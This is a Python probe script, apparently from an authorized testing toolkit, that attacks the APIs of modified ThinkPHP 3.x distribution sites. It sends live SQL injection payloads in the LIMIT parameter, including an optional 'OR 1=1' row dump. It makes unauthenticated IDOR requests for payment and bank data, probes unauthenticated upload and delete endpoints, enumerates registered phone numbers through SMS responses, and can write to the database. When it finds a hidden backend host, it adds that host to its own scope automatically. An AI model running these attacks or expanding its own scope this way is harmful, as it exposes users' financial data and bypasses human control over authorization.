#!/usr/bin/env python3
"""ThinkPHP 3.x 魔改分销 / ApiXxx 表面（授权范围内）。

默认只读 + SELECT 布尔。禁止对 message_delete 发 OR。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-tp3-fenxiao"
CLIP_COPY_RE = re.compile(r"addEventListener\s*\(\s*['\"]copy['\"]", re.I)
CLIP_SET_RE = re.compile(r"clipboardData\.setData")
WALLET_RE = re.compile(
    r"T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40}|bc1[a-z0-9]{25,}",
    re.I,
)
BASEURL_RE = re.compile(r"""baseURL\s*[:=]\s*['"](https?://[^'"]+)['"]""", re.I)
API_JS_RE = re.compile(
    r"""['"](/?(?:static/)?js/[^'"]+\.js)['"]|index\.[a-f0-9]{6,}\.js"""
)


def _sess() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = UA
    return s


def _req(
    sess: requests.Session, method: str, url: str, **kw
) -> requests.Response | None:
    kw.setdefault("timeout", 12)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", True)
    try:
        return sess.request(method, url, **kw)
    except Exception:
        return None


def _jsonish(r: requests.Response | None) -> Any:
    if r is None:
        return None
    try:
        return r.json()
    except Exception:
        t = (r.text or "").strip()
        if t.startswith("{") or t.startswith("["):
            try:
                return json.loads(t)
            except Exception:
                return None
        return None


def _hit(findings: list[dict[str, Any]], **row: Any) -> None:
    findings.append(row)
    lvl = row.get("level", "")
    sig = row.get("signal", "")
    print(f"  {lvl} {sig} {row.get('path', '')}")


def probe_l1(sess: requests.Session, base: str, findings: list[dict[str, Any]]) -> None:
    r = _req(sess, "GET", urljoin(base, "/ThinkPHP/README.md"))
    if r is not None and r.status_code == 200 and "thinkphp" in r.text.lower():
        _hit(
            findings, level="L1", signal="tp3-readme", path="/ThinkPHP/README.md",
            snippet=r.text[:180].replace("\n", " "),
        )
    r = _req(sess, "GET", urljoin(base, "/?a=1"))
    if r is not None and "FILE:" in r.text:
        m = re.search(r"/www/wwwroot/[^\s<]+|/ThinkPHP/[^\s<]+", r.text)
        _hit(
            findings, level="L1", signal="app-debug-path", path="/?a=1",
            path_leak=(m.group(0) if m else "yes")[:160],
        )
    r = _req(
        sess, "GET", urljoin(base, "/index.php"),
        headers={"Origin": "https://evil.example"},
    )
    if r is not None:
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "*" and acac.lower() == "true":
            _hit(
                findings, level="L1", signal="cors-star-credentials", path="/index.php",
                acao=acao, acac=acac,
                note="自定义 access-token 头仍可被任意源读",
            )


def probe_unauth_read(
    sess: requests.Session, base: str, findings: list[dict[str, Any]]
) -> None:
    reads = (
        ("/index.php/ApiUserFenxiao/get_fenxiao_db_data", "fenxiao-fund", ("admin_now_money", "min_recharge")),
        ("/index.php/ApiUser/get_agency_contract", "agency-contract", ("统一社会信用", "合同", "代理")),
        ("/index.php/ApiGoods/get_list", "goods-list", ("goods", "price", "商品")),
        ("/index.php/AppVersion/chk_update", "app-update", ("apk", "has_new_app", "download")),
    )
    for path, sig, needles in reads:
        r = _req(sess, "GET", urljoin(base, path))
        if r is None or r.status_code >= 500:
            continue
        body = r.text[:8000]
        if not any(n.lower() in body.lower() for n in needles) and r.status_code != 200:
            continue
        if sig == "fenxiao-fund" and "admin_now_money" in body:
            data = _jsonish(r) or {}
            if isinstance(data, dict) and isinstance(data.get("data"), dict):
                data = {**data, **data["data"]}
            _hit(
                findings, level="L2", signal=sig, path=path,
                keys=[k for k in data][:20] if isinstance(data, dict) else [],
                admin_now_money_masked=str((data or {}).get("admin_now_money", ""))[:3] + "***",
            )
            continue
        if sig == "app-update":
            data = _jsonish(r) or {}
            url = ""
            if isinstance(data, dict):
                url = str(data.get("apk_download_url") or data.get("url") or "")
            host = (urlparse(url).hostname or "").lower()
            self = (urlparse(base).hostname or "").lower()
            third = bool(host) and host != self and not host.endswith("." + self)
            if "apk" in body.lower() or "has_new_app" in body or url:
                _hit(
                    findings, level="L2" if third else "L1",
                    signal="chk-update-third-apk" if third else "chk-update",
                    path=path, apk_host=host, third_party=third,
                )
            continue
        if any(n.lower() in body.lower() for n in needles) or (
            sig == "agency-contract" and r.status_code == 200 and len(body) > 400
        ):
            _hit(
                findings, level="L2", signal=sig, path=path,
                status=r.status_code, bytes=len(r.content or b""),
            )
    r = _req(
        sess, "POST", urljoin(base, "/index.php/ApiUserMoney/get_my_data"),
        data={"user_id": "1"},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if r is not None and r.status_code == 200:
        body = r.text[:3000]
        if any(k in body for k in ("alipay", "bankCard", "Withdrawal", "payRecord")):
            _hit(
                findings, level="L2", signal="idor-get-my-data",
                path="/index.php/ApiUserMoney/get_my_data",
                note="无 token + user_id=1 回到业务层",
            )
    r = _req(
        sess, "POST", urljoin(base, "/index.php/Upload/upload_one"),
        files={"file": ("x.txt", b"x", "text/plain")},
    )
    if r is not None and r.status_code < 500:
        if "上传" in r.text or "目录" in r.text or "不存在" in r.text:
            _hit(
                findings, level="L2", signal="upload-unauth-reachable",
                path="/index.php/Upload/upload_one", snippet=r.text[:120],
            )


def probe_sqli_author(
    sess: requests.Session, base: str, findings: list[dict[str, Any]], *, or_dump: bool
) -> None:
    paths = (
        "/index.php/ApiCommon/common_get_author_list",
        "/index.php/ApiUser/common_get_author_list",
    )

    def total(url: str, q: str) -> int | None:
        r = _req(sess, "GET", url, params={"page": "1", "limit": q})
        data = _jsonish(r)
        if isinstance(data, dict):
            t = data.get("total", data.get("count"))
            try:
                return int(t)
            except (TypeError, ValueError):
                return None
        return None

    for path in paths:
        url = urljoin(base, path)
        t_true = total(url, "10 AND 1=1")
        t_false = total(url, "10 AND 1=2")
        t_base = total(url, "10")
        if t_true is None and t_false is None and t_base is None:
            continue
        hit = False
        if t_true is not None and t_false is not None and t_true != t_false:
            _hit(
                findings, level="L2", signal="sqli-limit-boolean", path=path,
                total_true=t_true, total_false=t_false, total_base=t_base,
            )
            hit = True
        if or_dump:
            t_or = total(url, "10 OR 1=1")
            if t_or is not None and t_base is not None and t_or > t_base:
                _hit(
                    findings, level="L2", signal="sqli-limit-or-dump", path=path,
                    total_or=t_or, total_base=t_base,
                )
                hit = True
        if hit or (t_true is not None and t_false is not None):
            break


def probe_sms_oracle(
    sess: requests.Session, base: str, findings: list[dict[str, Any]]
) -> None:
    r = _req(
        sess, "POST", urljoin(base, "/index.php/ApiUser/common_send_sms"),
        data={"mobile": "10000000000"},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if r is None:
        return
    info = ""
    data = _jsonish(r)
    if isinstance(data, dict):
        info = str(data.get("info") or data.get("msg") or "")
    blob = r.text + info
    if "手机号不存在" in blob or "验证码错误" in blob or (
        "不存在" in blob and "手机" in blob
    ):
        _hit(
            findings, level="L2", signal="sms-user-oracle",
            path="/index.php/ApiUser/common_send_sms",
            info=info or r.text[:80],
            note="只打过无效号；禁止号段爆破",
        )


def probe_oauth(
    sess: requests.Session, base: str, findings: list[dict[str, Any]]
) -> None:
    r = _req(
        sess, "POST", urljoin(base, "/index.php/ApiUser/user_weixin_login"),
        data={},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False,
    )
    if r is not None:
        blob = r.text[:4000]
        if "state=STATE" in blob or "state=STATE%" in blob:
            _hit(
                findings, level="L2", signal="oauth-state-hardcoded",
                path="/index.php/ApiUser/user_weixin_login",
            )
        if "snsapi_userinfo" in blob:
            _hit(
                findings, level="L1", signal="oauth-scope-userinfo",
                path="/index.php/ApiUser/user_weixin_login",
            )
        loc = r.headers.get("Location") or ""
        if "code=" in loc and urlparse(loc).hostname not in {
            None, "", (urlparse(base).hostname or "").lower()
        }:
            _hit(
                findings, level="L2", signal="oauth-code-open-redirect",
                path="/index.php/ApiUser/user_weixin_login",
                location=loc[:160],
                next="传承/暗渡陈仓·2.md",
            )
    r2 = _req(
        sess, "POST", urljoin(base, "/index.php/ApiUser/user_weixin_login_callback"),
        data={"code": "SE_FAKE_CODE", "state": "WRONG_STATE"},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if r2 is not None and r2.status_code == 200 and "请先登录" not in r2.text:
        body = r2.text[:800]
        if "<html" in body.lower() or "<!doctype" in body.lower():
            pass
        elif "非法" not in body and body.strip():
            _hit(
                findings, level="L2", signal="oauth-callback-zero-check",
                path="/index.php/ApiUser/user_weixin_login_callback",
                note="任意 code/state 仍 200",
            )


def probe_delete_unauth(
    sess: requests.Session, base: str, findings: list[dict[str, Any]]
) -> None:
    for method in ("GET", "POST"):
        r = _req(
            sess, method, urljoin(base, "/index.php/ApiCommon/message_delete"),
            params={"id": "0"} if method == "GET" else None,
            data={"id": "0"} if method == "POST" else None,
        )
        if r is None:
            continue
        if "请先登录" in r.text:
            continue
        if "数据不存在" in r.text or '"status":0' in r.text.replace(" ", ""):
            _hit(
                findings, level="L2", signal="message-delete-unauth",
                path=f"{method} /index.php/ApiCommon/message_delete?id=0",
                note="无鉴权到 DB；禁止再发 OR 注入",
            )
            return


def probe_js(
    sess: requests.Session, base: str, findings: list[dict[str, Any]], case: str
) -> None:
    home = _req(sess, "GET", base + "/")
    blob = home.text[:200000] if home is not None else ""
    scripts = list(dict.fromkeys(API_JS_RE.findall(blob)))[:6]
    texts = [blob]
    for src in scripts:
        path = src if isinstance(src, str) else (src[0] if src else "")
        if not path:
            continue
        url = path if path.startswith("http") else urljoin(base + "/", path.lstrip("/"))
        r = _req(sess, "GET", url)
        if r is not None and r.status_code == 200:
            texts.append(r.text[:400000])
    joined = "\n".join(texts)
    hosts = set()
    for m in BASEURL_RE.finditer(joined):
        raw = m.group(1)
        h = (urlparse(raw).hostname or "").lower()
        self = (urlparse(base).hostname or "").lower()
        if h and h != self and "/index.php" in raw.lower():
            hosts.add(h)
            _hit(
                findings, level="L2", signal="hidden-backend-baseurl",
                path="js", backend=raw[:160],
                next=f"python3 炼蛊房/scope_expand.py --grant {h} --case {case or 'CASE'} --note TP3-JS-baseURL",
            )
    if CLIP_COPY_RE.search(joined) and CLIP_SET_RE.search(joined) and WALLET_RE.search(joined):
        _hit(
            findings, level="L2", signal="clipboard-hijack-js",
            path="js", note="copy 监听 + setData + 钱包形态；记 IOC，勿当本站支付钥",
        )
    if "test_pay_success" in joined:
        _hit(
            findings, level="L1", signal="test-pay-success-mentioned",
            path="js", note="生产留测试支付；触发先问",
        )
    if hosts and case:
        import subprocess
        for h in hosts:
            try:
                subprocess.run(
                    [
                        sys.executable, str(OPS / "scope_expand.py"),
                        "--grant", h, "--case", case, "--note", "TP3 JS baseURL",
                    ],
                    check=False, capture_output=True, text=True, timeout=20,
                )
            except Exception:
                pass
    app = _req(sess, "GET", urljoin(base, "/App/"))
    if app is not None and app.status_code == 200:
        body = app.text[:2000]
        if "Index of" in body or "App/Lib" in body or "Parent Directory" in body:
            _hit(
                findings, level="L2", signal="app-dir-listing", path="/App/",
                next="sensitive-dir-dump",
            )


def probe_write(sess: requests.Session, base: str, findings: list[dict[str, Any]]) -> None:
    r = _req(sess, "GET", urljoin(base, "/index.php/ApiUser/save_agency_contract"))
    if r is not None and ("is_agree" in r.text or "同意" in r.text):
        _hit(
            findings, level="L2", signal="get-write-agency-contract",
            path="/index.php/ApiUser/save_agency_contract",
            note="GET 写库已发（--write）",
        )


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.url)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.url}", file=sys.stderr)
        sys.exit(2)
    base = args.url.rstrip("/")
    sess = _sess()
    findings: list[dict[str, Any]] = []
    probe_l1(sess, base, findings)
    probe_unauth_read(sess, base, findings)
    probe_sqli_author(sess, base, findings, or_dump=bool(args.or_dump))
    probe_sms_oracle(sess, base, findings)
    probe_oauth(sess, base, findings)
    probe_delete_unauth(sess, base, findings)
    probe_js(sess, base, findings, args.case)
    if args.write:
        probe_write(sess, base, findings)
    report = {
        "target": args.url,
        "ts": datetime.now(UTC).isoformat(),
        "findings": findings,
        "playbook": "传承/幻三·分销.md",
        "next": "有资金/合同/SQLi 就填对象矩阵；隐藏后端先 scope_expand；DELETE 禁止 OR",
    }
    out = write_probe_json(
        report, case=args.case, out=args.out,
        case_subdir="tp3_fenxiao", filename="surface.json",
    )
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"[+] wrote {out}", file=sys.stderr)
    return report


def cmd_doctor() -> int:
    src = Path(__file__).read_text(encoding="utf-8")
    checks = [
        "in_scope" in src,
        "message_delete" in src and 'params={"id": "0"}' in src,
        "OR 1=1" in src and "or_dump" in src,
        "allow_redirects=False" in src,
        "alipay" in src and "bankCard" in src,
        (OPS.parent.parent / "传承/幻三·分销.md").is_file(),
        (OPS.parent.parent / "杀招/幻三·分销/SKILL.md").is_file(),
    ]
    print(f"doctor {sum(checks)}/{len(checks)}")
    return 0 if all(checks) else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="ThinkPHP 3.x 魔改分销 API 探针")
    ap.add_argument("-u", "--url", default="")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--or-dump", action="store_true", help="SELECT limit OR 1=1 扩行（非 DELETE）")
    ap.add_argument("--write", action="store_true", help="允许 GET 写合同等变库动作")
    ap.add_argument("--doctor", action="store_true")
    args = ap.parse_args()
    if args.doctor:
        return cmd_doctor()
    if not args.url:
        ap.error("需要 -u / --url")
    run(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
